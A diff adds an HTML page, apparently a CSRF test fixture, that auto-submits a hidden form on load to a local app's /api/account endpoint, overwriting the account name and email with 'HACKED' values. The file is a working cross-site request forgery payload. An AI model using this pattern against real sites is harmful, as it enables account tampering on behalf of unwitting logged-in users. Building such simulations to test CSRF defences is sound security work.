@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Malicious CSRF Page</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <h1>CSRF Attack Simulation</h1>
+    <form
+      action="http://localhost:5173/api/account"
+      method="POST"
+      enctype="application/x-www-form-urlencoded"
+    >
+      <input type="hidden" name="name" value="HACKED" />
+      <input type="hidden" name="email" value="hacked@evil.test" />
+    </form>
+  </body>
+</html>
